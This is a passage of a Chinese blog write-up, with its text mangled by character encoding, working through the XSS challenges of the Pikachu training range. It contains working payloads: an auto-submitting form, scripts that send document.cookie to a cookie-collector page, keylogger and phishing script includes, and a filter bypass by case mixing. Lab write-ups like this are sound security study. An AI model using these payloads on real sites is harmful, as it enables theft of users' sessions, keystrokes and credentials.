<p>æµ‹è¯•XSSï¼Œèƒ½Xåˆ°æœ¬é¡µé¢ï¼ŒXçˆ†<br>ä½†æ˜¯è¿™æ¬¡URLæ²¡æœ‰æ˜¾ç¤ºè¾“å…¥</p>
<p>æŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°æ˜¯POSTæ–¹æ³•ï¼Œ<code>message</code>å­—æ®µå­˜åœ¨XSSæ¼æ´</p>
<p>æŸ¥çœ‹é¡µé¢æºç <br><strong>è¡¨å•actionå­—æ®µä¸ºç©ºï¼ŒåŠ ä¸Šé¡µé¢æœ¬èº«æ˜¯phpé¡µé¢</strong><br><strong>è¯´æ˜æ•°æ®æ˜¯é€šè¿‡POSTæäº¤ç»™é¡µé¢æœ¬èº«ï¼Œé¡µé¢æœ¬èº«å†ä½œå‡ºå“åº”</strong></p>
<p>æ‰€ä»¥URLç›´æ¥é’“é±¼è¿™ä¸€å—å¯èƒ½ä¸å¤ªè¡Œ<br>å¾—è‡ªå·±æ„é€ æ¶æ„é¡µé¢ï¼ŒåŒ…å«ä¸€ä¸ªæ¶æ„è¡¨å•<br>æ¥å°†ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…æ•è·cookieçš„API</p>
<p>äºæ˜¯æœ‰å¦‚ä¸‹é’“é±¼é¡µé¢ï¼Œæ–‡ä»¶å‘½åä¸ºpost.htmlï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.pikachu.com/vul/xss/xsspost/xss_reflected_post.php&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;xssr_in&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;document.location = &#x27;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è§£æä¸€ä¸‹ï¼š</p>
<ul>
<li>bodyçš„è¡¨å•é‚£é‡Œï¼Œæäº¤ç›®æ ‡å°±æ˜¯å‘ç°çš„æœ‰XSSæ¼æ´çš„é¡µé¢</li>
<li>æ ¹æ®ä¹‹å‰çš„æµ‹è¯•ç»“æœï¼Œå°†<code>message</code>å­—æ®µçš„é»˜è®¤å€¼è®¾ç½®ä¸ºXSS payload</li>
<li>å…³é”®æ˜¯å¤´éƒ¨é‚£é‡Œçš„JSè„šæœ¬ï¼Œè®¾ç½®æˆäº†<strong>é¡µé¢åŠ è½½æ—¶è‡ªåŠ¨æäº¤è¡¨å•</strong>ï¼ˆwindow.onloadï¼‰</li>
</ul>
<p>è¿™æ ·æ”»å‡»è€…æŠŠè¿™ä¸ªé¡µé¢éƒ¨ç½²åˆ°æ¶æ„æœåŠ¡å™¨ä¸Š<br>å†å½¢æˆè¿™ä¸ªé¡µé¢çš„é’“é±¼é“¾æ¥<br>å°±å¯ä»¥å‹¾cookieäº†</p>
<p>å¦‚è¿™ä¸ªé’“é±¼é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://www.pikachu.com/pkxss/xcookie/post.html">http://www.pikachu.com/pkxss/xcookie/post.html</a><br>ä¸€ç‚¹ï¼ŒçŸ­æš‚æ˜¾ç¤ºPikachué¶åœºé¡µé¢ï¼Œéšå³è·³è½¬ç™¾åº¦</p>
<p>æŸ¥çœ‹cookieæ•è·è®°å½•ï¼Œæœ‰äº†ç”¨æˆ·åå’Œå¯†ç çš„hashï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030100459470.png" alt="image-20211030100459470"></p>
<h3 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h3><p>ä¸€ä¸ªç•™è¨€æ¿ï¼Œç•™è¨€åå›æ˜¾åˆ°é¡µé¢</p>
<p>å°è¯•XSSï¼Œæœ‰ï¼ŒXçˆ†<br>Xä¸€ä¸ªå¼¹æ¡†ï¼Œç•™åœ¨äº†é¡µé¢ä¸Š<br>ä¹‹åæ¯æ¬¡è®¿é—®è¿™ä¸ªé¡µé¢éƒ½ä¼šå¼¹æ¡†</p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œå¤§æ¦‚å°±<strong>ä¸ç”¨è€ƒè™‘ä»€ä¹ˆç¤¾å·¥æ–¹æ³•</strong>å»é’“é±¼<br>å› ä¸ºæ”»å‡»è€…å¯ä»¥ç›´æ¥æŠŠpayloadéƒ¨ç½²åœ¨ç•™è¨€æ¿ä¸Š<br>æ¯ä¸ªçœ‹åˆ°ç•™è¨€æ¿çš„äººéƒ½ä¼šä¸­æ‹›<br>è¿™æ—¶å€™å¯åˆ©ç”¨çš„ç‚¹ä¹Ÿæ¯”è¾ƒå¤šäº†å§ï¼Ÿåº”è¯¥</p>
<p>å…ˆæ¥è¯•è¯•ç®€å•çš„ç›—cookie<br>payloadï¼š<code>ä¸€èˆ¬è·¯è¿‡å™¶è¿ªæ©&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#39;+document.cookie+&#39;&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot; /&gt;&#39;)&lt;/script&gt;</code><br>ç„¶åé¡µé¢ä¸Šå°±å‡ºç°äº†è¿™ä¸ªçœ‹èµ·æ¥å¾ˆæ™®é€šçš„ç•™è¨€ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030103701947.png" alt="image-20211030103701947"></p>
<p>ä½†å®é™…ä¸Šï¼Œæ¯ä¸ªç”¨æˆ·æµè§ˆåˆ°è¿™ä¸ªç•™è¨€ï¼Œéƒ½å·²ç»å·å·åœ°æŠŠcookieå‘é€ç»™äº†æ”»å‡»è€…</p>
<hr>
<p>ç„¶åè¯•è¯•é’“é±¼</p>
<p>æ ¹æ®ä¸Šé¢è®²åˆ°çš„<a href="#%E4%BF%A1%E6%81%AF%E9%92%93%E9%B1%BC">fish.php</a>ï¼Œåœ¨ç•™è¨€æ¿æ‰“å…¥ä»¥ä¸‹payloadï¼š<br><code>ä¸€èˆ¬è·¯è¿‡å™¶è¿ªæ©&lt;script src=&quot;http://www.pikachu.com/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</code><br>å…¶ä»–ç”¨æˆ·ä¸€æµè§ˆå°±ä¼šå¼¹å‡ºä¸‹é¢çš„è¾“å…¥æ¡†ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030115532885.png" alt="image-20211030115532885"></p>
<p>è¯„è®ºæ²¡åŠ è½½å®Œå°±å¼¹çª—ï¼Œè€Œä¸”å¼¹çª—ä¿¡æ¯ä¹±ç ï¼Œä¸€çœ‹å°±çŸ¥é“æœ‰è¯ˆã€‚ã€‚ã€‚ã€‚</p>
<p>ä½†æ˜¯ä¸‹é¢ä¸ç®¡è¾“å…¥å¤šå°‘æ¬¡ï¼Œå‘ç°éƒ½ä¼šä¸€ç›´ä¼šå¼¹çª—<br>debugä¸€ä¸‹ï¼Œå‘ç°ä¼ è¾“ç”¨æˆ·åå¯†ç åPHPé‚£è¾¹æ ¹æœ¬ä¸ä¼šè®¾ç½®<code>$_SERVER[&#39;PHP_AUTH_USER&#39;]</code>å’Œ<code>$_SERVER[&#39;PHP_AUTH_PW&#39;]</code>è¿™ä¸¤ä¸ªå­—æ®µ<br>æ‰€ä»¥ä¸€ç›´æ²¡æœ‰é€šä¸è¿‡é€»è¾‘æ£€æµ‹ï¼Œä¼šä¸€ç›´è¦æ±‚è®¤è¯</p>
<p>å†²æµªï¼Œäº†è§£åˆ°åœ¨Apacheé‡Œé¢ï¼Œè‹¥æƒ³é€šè¿‡PHPä½¿ç”¨Basicè®¤è¯ï¼Œåªæœ‰å°†PHP<strong>ä»¥æ¨¡å—æ–¹å¼è¿è¡Œ</strong>æ‰æœ‰æ•ˆã€‚è€Œå°çš®é¢æ¿å®‰è£…æ—¶ï¼Œé»˜è®¤æ˜¯æŒ‰CGIæ¨¡å¼å®‰è£…PHPçš„ï¼Œå› æ­¤ä¸Šé¢çš„fish.phpä¸èƒ½æ­£å¸¸èµ·ä½œç”¨</p>
<p>è§£å†³æ–¹æ³•å°±æ˜¯é‡æ–°éƒ¨ç½²PHPåœ¨Apacheä¸­çš„è¿è¡Œæ¨¡å¼<br>å…·ä½“å°±æ˜¯ç¼–è¾‘Apacheçš„httpd.confï¼Œå°†ç±»ä¼¼äºä¸‹é¢çš„é…ç½®èµ·ä½œç”¨ï¼š<br><code>LoadModule php7_module &quot;D:/php-7.4.9/php7apache2_4.dll&quot;</code><br><code>AddType application/x-httpd-php .php</code><br><code>PHPIniDir &quot;D:/php-7.4.9&quot;</code><br>ç„¶åé‡å¯æœåŠ¡ä»€ä¹ˆçš„</p>
<p>è¦åœ¨å°çš®é¢æ¿é‡Œæ”¹å°±æ¯”è¾ƒéº»çƒ¦<br>æ‰€è°“æœ‰åˆ©æœ‰å¼Šã€‚ã€‚ã€‚ã€‚<br>&#x3D;&#x3D;æœ‰ç¼˜å†å¼„&#x3D;&#x3D;</p>
<hr>
<p>æœ€åå†è¯•è¯•é”®ç›˜è®°å½•</p>
<p>æ ¹æ®ä¸Šé¢è®²åˆ°çš„<a href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95">rk.js</a>ï¼Œæ‰“å…¥ä¸‹é¢çš„payload</p>
<p><code>ä¸€èˆ¬è·¯è¿‡é¦†é•¿&lt;script src=&quot;http://www.pikachu.com/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></p>
<p>å¤šäº†ä¸ªäººç•œæ— å®³çš„ç•™è¨€ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211115215151112.png" alt="image-20211115215151112"></p>
<p>ä½†æ˜¯æ¶æ„è„šæœ¬å·²ç»è¢«åŠ è½½è¿›äº†æ¯ä¸ªæµè§ˆåˆ°è¿™æ¡è¯„è®ºçš„ç”¨æˆ·çš„æµè§ˆå™¨<br>éƒ½å·²ç»è¢«è®°å½•ä¸‹é”®ç›˜ç—•è¿¹äº†</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211115215633215.png" alt="image-20211115215633215"></p>
<hr>
<p><strong>å…³äºè·¨åŸŸ</strong></p>
<p>æ¦‚å¿µï¼š<strong>åè®®ã€åŸŸåã€ç«¯å£ä»»ä¸€ä¸åŒï¼Œåˆ™ä¸åŒæº</strong><br><strong>ä¸åŒ…æ‹¬è·¯å¾„ï¼</strong><br>ä¸åŒæºçš„èµ„æºä¼ è¾“ç§°ä¸ºè·¨åŸŸ</p>
<p>æµè§ˆå™¨é»˜è®¤çš„åŒæºç­–ç•¥ï¼šä¸åŒæºä¹‹é—´ä¸èƒ½ä½¿ç”¨JSè¿›è¡Œäº¤äº’</p>
<p>é™¤éç‰¹åˆ«é…ç½®<br>æœ€å¸¸è§çš„å°±æ˜¯æ·»åŠ headerï¼š<code>Access-Control-Allow-Origin:x/com</code><br>æ¥æŒ‡å®šå…è®¸è·¨åŸŸçš„åœ°å€</p>
<p>å¦‚æœ<a href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95">æ¥æ”¶æ•°æ®çš„API</a>å–æ¶ˆäº†è¿™ä¸ªheaderï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®ä¸å…è®¸è¢«è·¨åŸŸè®¿é—®ï¼ˆæ³¨é‡Šæ‰ï¼‰</span></span><br><span class="line"><span class="comment">//header(&quot;Access-Control-Allow-Origin:*&quot;);</span></span><br></pre></td></tr></table></figure>

<p><del>é‚£å°±ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼š</del></p>
<p>å‘ç°æ³¨é‡Šæ‰æ²¡ç”¨ï¼Œè¿˜æ˜¯å¯ä»¥è®°å½•<br>è¿™æ˜¯å› ä¸ºæ”»å‡»è€…æœåŠ¡å™¨å’Œé¶åœºæ˜¯åŒæºçš„ï¼ˆéƒ½æ˜¯ä¸€ä¸ªç«™ç‚¹ä¸‹çš„å†…å®¹ï¼‰ã€‚ã€‚ã€‚ã€‚<br>&#x3D;&#x3D;å¾—è€ƒè™‘ç§Ÿå°äº‘æœåŠ¡å™¨äº†&#x3D;&#x3D;</p>
<h3 id="DOMå‹XSS"><a href="#DOMå‹XSS" class="headerlink" title="DOMå‹XSS"></a>DOMå‹XSS</h3><p>è¾“å…¥æ¡†ï¼Œè¾“å…¥æäº¤ï¼Œä¸‹æ–¹ç”Ÿæˆä¸€ä¸ªé“¾æ¥<br>è¾“å…¥â€œ123â€ï¼Œç‚¹å‡»é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/123">http://www.pikachu.com/vul/xss/123</a><br>é‚£ç»“æœè‚¯å®šæ˜¯NOT FOUNDäº†</p>
<p>æ£€è§†ä¸€ä¸‹å…ƒç´ ï¼Œå‘ç°ä¸‹é¢æœ‰ä¸ª<code>&lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;</code>ï¼Œä¸€å¼€å§‹æ˜¯ç©ºçš„<br>æäº¤ä¹‹åå˜æˆäº†<code>&lt;div id=&quot;dom&quot;&gt;&lt;a href=&quot;123&quot;&gt;what do you see&lt;/a&gt;&lt;/div&gt;</code><br>å°±æ˜¯åŠ¨æ€æ·»åŠ äº†ä¸€ä¸ªaæ ‡ç­¾</p>
<p>çœ‹çœ‹å¯¹åº”çš„è„šæœ¬</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯é€šè¿‡DOMç¼–ç¨‹ï¼ŒåŠ¨æ€ä¿®æ”¹æ–‡æ¡£èŠ‚ç‚¹</p>
<p>å€’æœ‰ç‚¹åƒæ˜¯æ³¨å…¥ï¼Œå°è¯•ä¸»åŠ¨é—­åˆï¼Œæ„é€ ä¸‹é¢çš„payloadï¼š<br><code>&#39;&gt;&lt;/a&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;a&gt;</code><br>å…ƒç´ å˜æˆï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116085142853.png" alt="image-20211116085142853"></p>
<p>ä½†æ˜¯å¹¶æ²¡æœ‰å¼¹çª—ï¼ŒåŸæ¥æ˜¯<strong>scriptæ ‡ç­¾ä¸èƒ½åµŒå¥—åœ¨divæ ‡ç­¾ä¸­</strong></p>
<p>æ¢æˆè€ƒè™‘ï¼š<code>&#39;&gt;&lt;/a&gt;&lt;img src=&quot;123&quot; onerror=alert(&#39;123&#39;) /&gt;&lt;a&gt;</code><br>å®Œæˆå¼¹çª—ï¼Œè¯æ˜æœ‰DOMå‹XSS</p>
<p>æˆ–è€…æ˜¯<code>&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code><br>HTMLå˜æˆè¿™æ ·ï¼š<br><code>&lt;a href=&quot;&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code><br>ä¸€ç‚¹å‡»é“¾æ¥å°±ä¼šå¼¹çª—</p>
<hr>
<p>ä¸‹é¢è€ƒè™‘åˆ©ç”¨ï¼Œé¦–å…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå‘ç°æŠ“ä¸åˆ°<br>å› ä¸ºæ˜¯é€šè¿‡æœ¬åœ°JSè„šæœ¬æ‰§è¡Œçš„å‡½æ•°ï¼Œæ²¡æœ‰æ•°æ®åŒ…æµå‡º<br>å³æ˜¯<strong>çº¯å‰ç«¯çš„æ“ä½œ</strong><br>é‚£å’‹åˆ©ç”¨ï¼Ÿ</p>
<p>æœ‰äº›DOM XSSæ“ä½œä¹Ÿæ˜¯ä¼šåœ¨URLä¸­æ‹¼æ¥è¾“å…¥çš„ï¼Œè¿™ç§å°±é’“é±¼é“¾æ¥<br>ä½†æ˜¯ä¸Šé¢çš„ä¾‹å­æ²¡æœ‰æ‹¼æ¥åˆ°URL</p>
<p><del>éš¾é“åªèƒ½æ§åˆ¶å—å®³è€…ä¸»æœºï¼Ÿï¼Ÿï¼Ÿ</del></p>
<hr>
<p>è¡¥å……ç‚¹DOMçš„çŸ¥è¯†</p>
<p>DOMç›¸å½“äºåœ¨å‰ç«¯æä¾›äº†ä¸€ä¸ªé€šè¿‡JSå»å¯¹HTMLè¿›è¡Œæ“ä½œçš„æ¥å£</p>
<p>é€ æˆDOMå‹XSSçš„åŸå› ï¼š<br>å‰ç«¯è¾“å…¥è¢«DOMè·å–ï¼Œé€šè¿‡DOMåˆåœ¨å‰ç«¯è¾“å‡º<br>è·Ÿåå°„å‹å’Œå­˜å‚¨å‹æ¯”èµ·æ¥ï¼Œå®ƒæ˜¯ä¸ç»è¿‡åå°äº¤äº’çš„ï¼ˆ<strong>çº¯å‰ç«¯</strong>ï¼‰</p>
<p>å› æ­¤DOMå‹æ¯”ä¸€èˆ¬çš„åå°„å‹æ›´åŠ éš¾é˜²æŠ¤</p>
<hr>
<p>ä¸Šç½‘æ‰¾æ‰¾åˆ©ç”¨åœºæ™¯<br>æ‰¾ä¸åˆ°æ²¡æœ‰URLæ‹¼æ¥çš„DOMå‹åˆ©ç”¨åœºæ™¯å•Šå•Šå•Šå•Š<br><del>æ¥ä¸€æ‰‹ç‰©ç†é»‘å®¢</del></p>
<h3 id="DOMå‹XSS-X"><a href="#DOMå‹XSS-X" class="headerlink" title="DOMå‹XSS-X"></a>DOMå‹XSS-X</h3><p>å¥‡æ€ªçš„é¢˜ç›®ï¼Œä¸€ä¸ªè„šæœ¬ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">	<span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰é’ˆå¯¹URLçš„æ“ä½œï¼Œå…·ä½“æ˜¯æˆªæ–­URLï¼Œç„¶åæ›¿æ¢â€˜+â€™ä¸ºç©ºæ ¼<br>æ–¹ä¾¿XSS<br>ä¹Ÿå¤ªå¥½äººäº†å§</p>
<p>ç„¶åHTMLä¹Ÿå¾ˆå¥‡æ€ªï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116093312822.png" alt="image-20211116093312822"></p>
<p>è¡¨å•æ˜¯GETæäº¤åˆ°æœ¬é¡µé¢ï¼Œä¼šæ‹¼æ¥URL<br>ä½†æ˜¯é‚£ä¸ªsubmitï¼Œä¹Ÿæ²¡æœ‰æŒ‡å‡ºä¼šæ‰§è¡Œä»€ä¹ˆæ“ä½œ</p>
<p>è¾“å…¥â€œ123â€ï¼Œç‚¹å‡»ï¼Œå˜æˆè¿™æ ·ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116094051177.png" alt="image-20211116094051177"></p>
<p>URLå˜æˆï¼š<a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xss_dom_x.php?text=123">http://www.pikachu.com/vul/xss/xss_dom_x.php?text=123</a><br>textå‚æ•°åé¢è·Ÿäº†è¾“å…¥å†…å®¹ï¼ˆå“¦ï¼Ÿï¼‰</p>
<p>å¤šäº†ä¸ªdivï¼Œæ”¾äº†ä¸ªæ‰§è¡Œä¸Šé¢è„šæœ¬çš„é“¾æ¥<br>ç‚¹å‡»é“¾æ¥ï¼ŒDOMæ“ä½œç”ŸæˆèŠ‚ç‚¹ï¼Œç±»ä¼¼äºä¸Šé¢çš„DOMå‹XSS</p>
<p>æ£€æµ‹åˆ°æœ‰XSSï¼š<code>&#39;&gt;&lt;img src=&quot;e&quot; onerror=alert(&#39;XSS&#39;) /&gt;</code></p>
<p>ç›´æ¥æ‰“å…¥payloadï¼š<br><code>&#39;&gt;&lt;img src=&quot;e&quot; onerror=document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie; /&gt;</code><br>ç”Ÿæˆé“¾æ¥ï¼š<br><a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xss_dom_x.php?text=%27%3E%3Cimg+src=%22e%22+onerror=document.location=%22http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=%22+document.cookie;+/%3E">http://www.pikachu.com/vul/xss/xss_dom_x.php?text=%27%3E%3Cimg+src%3D%22e%22+onerror%3Ddocument.location%3D%22http%3A%2F%2Fwww.pikachu.com%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B+%2F%3E</a></p>
<p>ç„¶ååˆ©ç”¨è¿™ä¸ªé“¾æ¥ï¼Œå†è¯±æƒ‘å—å®³è€…ç‚¹å‡»ä¸‹ä¸€ä¸ªæŒ‰é’®ï¼Œå°±å¯ä»¥é’“åˆ°cookieäº†</p>
<h3 id="XSSä¹‹ç›²æ‰“"><a href="#XSSä¹‹ç›²æ‰“" class="headerlink" title="XSSä¹‹ç›²æ‰“"></a>XSSä¹‹ç›²æ‰“</h3><p>ä¸€ä¸ªè¡¨å•ï¼ŒPOSTæäº¤åˆ°åŸé¡µé¢<br>æäº¤åä»…å›æ˜¾æ–°å¢çš„ä¸€ä¸ªpæ ‡ç­¾ï¼Œæ²¡æœ‰è¾“å…¥å†…å®¹ç›´æ¥å›æ˜¾</p>
<p>ä¸¤ä¸ªè¾“å…¥æ¡†éƒ½è¯•äº†è¯•XSSï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆæ•ˆæœï¼Œä¸€ç‚¹å›æ˜¾éƒ½æ²¡æœ‰</p>
<p>çœ‹çœ‹æç¤ºï¼ŒåŸæ¥ç®¡ç†å‘˜æœ‰ä¸ªåå°ï¼š<br><a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xssblind/admin.php">http://www.pikachu.com/vul/xss/xssblind/admin.php</a><br>ç™»è¿›å»çœ‹çœ‹ï¼Œå·²ç»å¼¹çª—è¢«å¼¹çˆ†äº†</p>
<p>çœ‹æ¥è¿™ç±»ç›²æ‰“ï¼Œæ„æ€æ˜¯çŒœæµ‹ç»“æœä¼šè¢«æäº¤åˆ°åå°<br>å†…å®¹ä¸ä¼šæ˜¾ç¤ºåœ¨åŸé¡µé¢<br>æ‰“çš„æ˜¯ç®¡ç†å‘˜ï¼Œå¥½åƒæ¯”è¾ƒå…­è‡‚ä¸€ç‚¹</p>
<p>é‚£ç®€å•äº†ï¼Œç›´æ¥textareaè¾“å…¥æ¡†æ‰“å…¥payloadï¼š<br><code>&lt;script&gt;document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code><br>ç„¶åå‘ç°å®Œäº†ï¼Œç®¡ç†å‘˜è¿›ä¸äº†åå°äº†ï¼Œæ— é™è·³è½¬è‡³ç™¾åº¦<br>remake</p>
<p>å†æ¥æ‰‹é’“é±¼ï¼š<br><code>äººç•œæ— å®³æœ±é¦†é•¿&lt;script src=&quot;http://www.pikachu.com/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></p>
<p>åå°æƒ…å†µï¼Œå¾ˆæ­£å¸¸ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116101948914.png" alt="image-20211116101948914"></p>
<p>ä½†æ˜¯é”®ç›˜æ“ä½œå·²è¢«è®°å½•</p>
<h3 id="XSSä¹‹è¿‡æ»¤"><a href="#XSSä¹‹è¿‡æ»¤" class="headerlink" title="XSSä¹‹è¿‡æ»¤"></a>XSSä¹‹è¿‡æ»¤</h3><p>é˜ä¸‹ï¼Œè¯·é—®ä½ è§‰å¾—äººç”Ÿè‹¦çŸ­å—ï¼Ÿ<br>æäº¤â€œYesâ€ï¼ŒURLæ‹¼æ¥ï¼Œä¸”å›æ˜¾åˆ°äº†åŸé¡µé¢ï¼š</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116102329676.png" alt="image-20211116102329676"></p>
<p>è¯•è¯•ç›´æ¥Xï¼Œä½†æ˜¯å¥½åƒè¢«è¿‡æ»¤äº†ï¼š<br>payloadï¼š<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code><br>ç»“æœï¼š<code>åˆ«è¯´è¿™äº›&#39;&gt;&#39;çš„è¯,ä¸è¦æ€•,å°±æ˜¯å¹²!</code><br>ä½†æ˜¯URLé‡Œé¢æ˜¾ç¤ºæ­£å¸¸</p>
<p>ç®€å•è¯•è¯•å¤§å°å†™æ··æ‹¼ï¼š<code>SCRipt</code>ï¼Œå‘ç°å°±ç»•è¿‡äº†</p>
<hr>
<p><strong>ä¸€äº›ç»•è¿‡æ€è·¯</strong></p>
<p>è¿™é‡Œæ˜¯<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASPçš„ç»•è¿‡å¤‡å¿˜å½•</a><br>&#x3D;&#x3D;æœ‰æœºä¼šçœ‹çœ‹å§ï¼Œä¹Ÿåœ¨å¦ä¸€ä»½ç¬”è®°é‡Œå†™å†™&#x3D;&#x3D;</p>
<p>è¿™é‡Œæ ¹æ®<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45868644/article/details/120192536">åˆ«äººçš„åšå®¢</a>ç®€å•è®°è®°</p>
